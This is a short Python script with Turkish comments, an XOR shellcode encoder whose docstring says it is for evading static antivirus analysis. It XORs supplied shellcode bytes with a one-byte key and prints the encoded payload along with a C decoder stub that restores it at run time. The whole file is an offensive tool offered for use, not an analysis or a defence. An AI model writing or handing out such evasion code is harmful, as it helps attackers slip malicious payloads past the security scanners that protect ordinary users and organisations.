#!/usr/bin/env python3
"""
XOR Shellcode Encoder
=====================
Shellcode'u XOR ile şifreler (Statik AV analizi atlatma).
"""
import sys

def xor_encode(shellcode_hex, key):
    shellcode = bytes.fromhex(shellcode_hex.replace("\\x", "").replace(" ", ""))
    encoded = bytearray()
    
    for i in range(len(shellcode)):
        encoded.append(shellcode[i] ^ key)
        
    encoded_hex = "\\x" + "\\x".join(f"{b:02x}" for b in encoded)
    
    print("[*] Orijinal Uzunluk:", len(shellcode))
    print("[*] XOR Anahtarı:", hex(key))
    print("[+] Şifrelenmiş Shellcode:")
    print(encoded_hex)
    
    decoder_stub = f"""
# Decoder C taslağı:
# unsigned char payload[] = "{encoded_hex}";
# for(int i=0; i<sizeof(payload)-1; i++) {{
#     payload[i] = payload[i] ^ {hex(key)};
# }}
"""
    print(decoder_stub)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Kullanım: python Shellcode_Encoder.py \"<SHELLCODE_HEX>\" <KEY_INT>")
        print("Örnek: python Shellcode_Encoder.py \"\\x90\\x90\\xcc\" 170")
        sys.exit(1)
    
    sc = sys.argv[1]
    k = int(sys.argv[2])
    xor_encode(sc, k)
